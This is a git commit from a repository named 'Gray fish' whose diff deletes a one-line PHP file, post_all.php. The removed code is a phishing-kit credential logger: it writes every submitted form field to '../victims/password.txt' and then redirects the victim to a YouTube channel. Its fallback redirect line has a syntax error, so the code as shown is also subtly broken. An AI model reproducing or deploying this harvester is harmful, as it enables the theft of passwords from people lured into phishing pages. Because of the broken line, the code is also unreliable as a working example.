544ee74485e6cbd52f1c484bd2bd6fab0bc11407
Gray Programmerz <hackrefisher@gmail.com>
2019-09-12 11:09:09 +0500

    Delete post_all.php

--- Gray fish/other/post_all.php
+++
@@ -1,1 +0,0 @@
-<?php if($_SERVER['REQUEST_METHOD']==='POST'){header('Location: https://www.youtube.com/c/greenterminals');$handle=fopen(".././victims/password.txt","a");foreach($_POST as $variable=>$value){fwrite($handle,$variable);fwrite($handle,"=");fwrite($handle,$value);fwrite($handle,"\r\n");}fwrite($handle,"\r\n");fclose($handle);exit;}else{header('Location: '$_SERVER["HTTP_REFERER"]);}?>
